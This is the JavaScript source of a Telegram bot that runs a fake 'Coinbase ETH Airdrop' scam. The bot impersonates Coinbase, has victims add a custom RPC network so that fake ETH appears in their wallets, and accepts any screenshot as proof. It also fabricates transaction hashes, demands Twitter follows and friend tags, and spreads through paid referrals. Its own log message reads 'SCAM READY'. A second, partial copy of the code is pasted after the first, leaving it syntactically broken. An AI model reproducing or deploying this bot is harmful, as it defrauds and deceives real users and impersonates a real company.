require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');
const axios = require('axios');

// === IN-MEMORY DB (NO MONGODB) ===
let usersDB = {};

// Helper functions
const getUser = (id) => usersDB[id] || null;
const saveUser = (user) => { usersDB[user.telegramId] = user; return user; };
const updateUser = (id, updates) => {
  if (usersDB[id]) Object.assign(usersDB[id], updates);
  return usersDB[id];
};
const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// === BOT & SERVER ===
const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();
app.use(express.json());
app.use(bot.webhookCallback(`/bot${process.env.BOT_TOKEN}`));

// === CONSTANTS ===
const RPC_GUIDE = `
Add this network to Coinbase Wallet:

**Network Name:** Coinbase ETH Airdrop
**RPC URL:** https://rpc.tenderly.co/devnet/coinbase-airdrop-90000
**Chain ID:** 90000
**Currency:** ETH
**Block Explorer:** https://dashboard.tenderly.co
`.trim();

// === FAKE ETH SEND (Tenderly RPC) ===
const sendFakeETH = async (to, eth) => {
  if (!to || to === '0xFAKE') return;
  const wei = (eth * 1e18).toString(16);
  try {
    await axios.post(process.env.TENDERLY_RPC || 'https://rpc.tenderly.co/devnet/coinbase-airdrop-90000', {
      jsonrpc: "2.0",
      method: "eth_sendTransaction",
      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }],
      id: Date.now()
    });
    console.log(`FAKE SENT: ${eth} ETH → ${to}`);
  } catch (err) {
    console.log('Fake send failed (ignored):', err.message);
  }
};

// === /start COMMAND ===
bot.start(async (ctx) => {
  console.log('START COMMAND FIRED:', ctx.from.id);
  let user = getUser(ctx.from.id);
  const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;

  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    user = {
      telegramId: ctx.from.id,
      username: ctx.from.username || 'unknown',
      referralCode: code,
      referredBy: refCode,
      stage: 'wallet_ss',
      wallet: null,
      referrals: [],
      totalEarned: 0
    };
    saveUser(user);

    // === REFERRAL PAYOUT ===
    if (refCode) {
      const referrer = getUserByCode(refCode);
      if (referrer && referrer.telegramId !== ctx.from.id) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        updateUser(referrer.telegramId, referrer);
        await sendFakeETH(referrer.wallet || '0xFAKE', 0.004); // $10
        bot.telegram.sendMessage(referrer.telegramId,
          `*+1 Referral!* You earned $10 ETH!\n` +
          `Total: $${referrer.totalEarned}\n` +
          `Referral link: t.me/coinbase_eth_airdrop_bot?start=ref_${referrer.referralCode}`,
          { parse_mode: 'Markdown' }
        );
      }
    }
  }

  ctx.reply(`Drop your Coinbase wallet address + screenshot, fucker.`);
});

// === PHOTO HANDLER (FAKE VALIDATION) ===
bot.on('photo', async (ctx) => {
  console.log('PHOTO RECEIVED:', ctx.from.id);
  let user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start first, asshole.');

  if (user.stage === 'wallet_ss') {
    user.wallet = "0x" + Math.random().toString(16).substr(2, 40);
    user.stage = 'rpc_guide';
    saveUser(user);
    ctx.reply(RPC_GUIDE, {
      reply_markup: { inline_keyboard: [[{ text: "I Added Network", callback_data: "rpc_done" }]] }
    });
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);
    ctx.reply(`RPC locked. Now:\n` +
      `1. Follow @BjExchange53077\n` +
      `2. Like pinned post\n` +
      `3. Tag 3 friends\n` +
      `Send proof.`);
    return;
  }

  if (user.stage === 'twitter_proof') {
    user.stage = 'claim_ready';
    saveUser(user);
    ctx.reply(
      `*Tasks verified!* You earned $50 ETH!\n\n` +
      `Click below to claim:`,
      {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[{ text: "CLAIM $50 ETH", callback_data: "claim_eth" }]] }
      }
    );
    return;
  }

  ctx.reply("Photo received. Keep going, fucker.");
});

// === BUTTON: RPC DONE ===
bot.action('rpc_done', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_guide') return;
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.reply("Send screenshot of Chain ID 90000 now.");
});

// === BUTTON: CLAIM $50 ETH ===
bot.action('claim_eth', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'claim_ready') return ctx.answerCbQuery('Not ready.');

  user.stage = 'claimed';
  saveUser(user);

  await sendFakeETH(user.wallet, 0.02); // $50

  const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
  ctx.reply(
    `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
    `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
    `*Share your link:*\nt.me/coinbase_eth_airdrop_bot?start=ref_${user.referral  ` +
    `\nEarn $10 per referral!`,
    { parse_mode: 'Markdown' }
  );
});

// === ERROR CATCHER ===
bot.catch((err, ctx) => {
  console.error('BOT ERROR:', err);
  try { ctx.reply('Something fucked up. Try again.'); } catch {}
});

// === SERVER START ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Bot running on port ${PORT}`);
  const url = `${process.env.RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
  await bot.telegram.setWebhook(url);
  console.log('Webhook set:', url);
});    }
  }
  ctx.reply(`Drop Coinbase wallet + screenshot, fucker.`);
});

const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// Fake ETH sender (your Tenderly RPC)
const sendFakeETH = async (to, eth) => {
  const wei = (eth * 1e18).toString(16);
  await require('axios').post(process.env.TENDERLY_RPC, {
    jsonrpc: "2.0",
    method: "eth_sendTransaction",
    params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }],
    id: Date.now()
  }).catch(() => console.log('Fake ETH sent (ignored error)'));
};

// Photo handler (fake validation — accepts anything)
bot.on('photo', async (ctx) => {
  console.log('PHOTO RECEIVED'); // DEBUG
  let user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Start first, asshole.');

  if (user.stage === 'wallet_ss') {
    user.wallet = "0xFAKE" + Math.random().toString(16).substr(2, 40); // Fake wallet
    user.stage = 'rpc_guide';
    saveUser(user);
    ctx.reply(RPC_GUIDE, { reply_markup: { inline_keyboard: [[{ text: "I Added Network ✅", callback_data: "rpc_done" }]] }});
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);
    ctx.reply(`RPC locked. Now follow @BjExchange53077, like pinned post, tag 3 friends. Send proof.`);
    return;
  }

  ctx.reply("Photo received. Keep going, fucker.");
});

bot.action('rpc_done', async (ctx) => {
  let user = getUser(ctx.from.id);
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.reply("Send screenshot of Chain ID 90000 now.");
});

// Error catcher (swallow crashes)
bot.catch((err, ctx) => {
  console.error('BOT ERROR:', err);
  ctx.reply('Something fucked up, try again.');
});

// After Twitter proof
if (user.stage === 'twitter_proof') {
  user.stage = 'claim_ready';
  saveUser(user);
  ctx.reply(
    "Tasks verified. You earned $50 ETH!\n\n" +
    "Click below to claim:",
    { reply_markup: { inline_keyboard: [[{ text: "CLAIM $50 ETH", callback_data: "claim_eth" }]] }}
  );
  return;
}

bot.action('claim_eth', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'claim_ready') return;

  user.stage = 'claimed';
  saveUser(user);

  // FAKE TRANSACTION (Tenderly RPC)
  await sendFakeETH(user.wallet, 0.02); // 0.02 ETH = $50

  ctx.reply(
    `✅ $50 ETH sent to:\n\`${user.wallet}\`\n\n` +
    `Transaction: https://dashboard.tenderly.co/tx/mainnet/0xFAKE${Math.random().toString(16).substr(2, 64)}\n\n` +
    `Share your referral link: t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}\n` +
    `Earn $10 per referral!`,
    { parse_mode: 'Markdown' }
  );
});

// Launch
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Bot running on port ${PORT}`);
  bot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`);
  console.log('Webhook set — SCAM READY');
});
